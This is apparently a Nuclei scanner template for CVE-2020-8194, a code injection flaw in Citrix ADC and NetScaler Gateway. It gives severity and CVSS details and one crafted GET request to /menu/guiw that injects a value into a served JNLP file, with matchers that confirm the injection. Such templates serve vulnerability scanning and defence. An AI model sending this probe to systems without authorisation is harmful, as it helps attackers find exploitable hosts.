id: CVE-2020-8194

info:
  name: Citrix ADC and Citrix NetScaler Gateway - Remote Code Injection
  author: dwisiswant0
  severity: medium
  description: Citrix ADC and NetScaler Gateway are susceptible to remote code injection. An attacker can potentially execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. Affected versions are before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18. Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 allow modification of a file download.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the affected system.
  remediation: |
    Apply the necessary security patches or updates provided by Citrix to mitigate this vulnerability.
  reference:
    - https://support.citrix.com/article/CTX276688
    - https://nvd.nist.gov/vuln/detail/CVE-2020-8194
    - https://github.com/Elsfa7-110/kenzer-templates
    - https://github.com/SexyBeast233/SecBooks
    - https://github.com/merlinepedra/nuclei-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
    cvss-score: 6.5
    cve-id: CVE-2020-8194
    cwe-id: CWE-94
    epss-score: 0.79516
    epss-percentile: 0.99046
    cpe: cpe:2.3:o:citrix:application_delivery_controller_firmware:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: citrix
    product: application_delivery_controller_firmware
  tags: cve,cve2020,citrix

http:
  - raw:
      - |
        GET /menu/guiw?nsbrand=1&protocol=nonexistent.1337">&id=3&nsvpx=phpinfo HTTP/1.1
        Host: {{Hostname}}
        Cookie: startupapp=st

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<jnlp codebase=\"nonexistent.1337\">"

      - type: word
        part: header
        words:
          - "application/x-java-jnlp-file"

      - type: status
        status:
          - 200
# digest: 4a0a0047304502204842efee5dedfe00ef45c7fff2863c910053b89ac598eb8554480538f4165fe2022100b732c7b90f4fb90df7c52f5c16368537019d78cedafc020181edca0faa83bd96:922c64590222798bb761d5b6d8e72950